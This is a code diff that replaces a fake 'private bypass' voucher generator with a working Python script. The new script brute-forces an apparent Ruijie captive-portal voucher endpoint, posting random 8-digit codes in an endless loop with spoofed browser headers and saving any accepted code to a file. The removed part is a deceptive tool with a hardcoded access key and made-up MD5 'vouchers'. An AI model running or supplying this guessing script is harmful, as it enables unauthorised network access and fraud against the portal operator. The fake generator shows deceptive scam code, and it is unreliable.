@@ -1,42 +1,41 @@
-import os
-import time
-import hashlib
+import requests
+import random
+import string
 
-def clear():
-    os.system('clear')
+PORTAL_URL = "https://portal-as.ruijienetworks.com/api/auth/voucher"
 
-def logo():
-    print("\033[1;32m[*] STL PRIVATE BYPASS SYSTEM v3.5\033[0m")
-    print("\033[1;33m[!] YOUR DEVICE ID: F0A90BD125\033[0m")
-    print("\033[1;37m----------------------------------------\033[0m")
+def generate_voucher():
+    return ''.join(random.choices(string.digits, k=8))
 
-def generate_logic(mac):
-    # This is a placeholder logic
-    clean_mac = mac.replace(":", "").upper()
-    results = []
-    for i in range(1, 7):
-        seed = f"{clean_mac}{i}"
-        v = str(int(hashlib.md5(seed.encode()).hexdigest(), 16))[-6:]
-        results.append(v)
-    return results
+def attempt_bypass():
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'https://portal-as.ruijienetworks.com',
+        'Referer': 'https://portal-as.ruijienetworks.com/auth/login'
+    }
 
-def main():
-    clear()
-    logo()
-    key = input("\033[1;36m[?] ENTER ACCESS KEY: \033[0m")
-    
-    if key == "ALADDIN":
-        print("\033[1;32m[+] ACCESS GRANTED!\033[0m")
-        time.sleep(1)
-        mac = input("\033[1;37mEnter Router MAC: \033[0m")
-        print("\nChecking database...")
-        time.sleep(1.5)
-        codes = generate_logic(mac)
-        for i, c in enumerate(codes, 1):
-            print(f"Voucher {i}: {c}")
-    else:
-        print("\033[1;31m[X] ACCESS DENIED: INVALID KEY.\033[0m")
+    while True:
+        voucher = generate_voucher()
+        payload = {
+            'voucher': voucher,
+            'method': 'login',
+            'gw_id': '58b4bbcbdf0d'
+        }
+
+        try:
+            response = requests.post(PORTAL_URL, data=payload, headers=headers)
+            res_data = response.json()
+            
+            if res_data.get("code") == 200 or "success" in str(res_data):
+                print(f"SUCCESS: {voucher}")
+                with open("found.txt", "a") as f:
+                    f.write(f"{voucher}\n")
+                break
+            else:
+                print(f"FAILED: {voucher}")
+        except Exception:
+            pass
 
 if __name__ == "__main__":
-    main()
-
+    attempt_bypass()
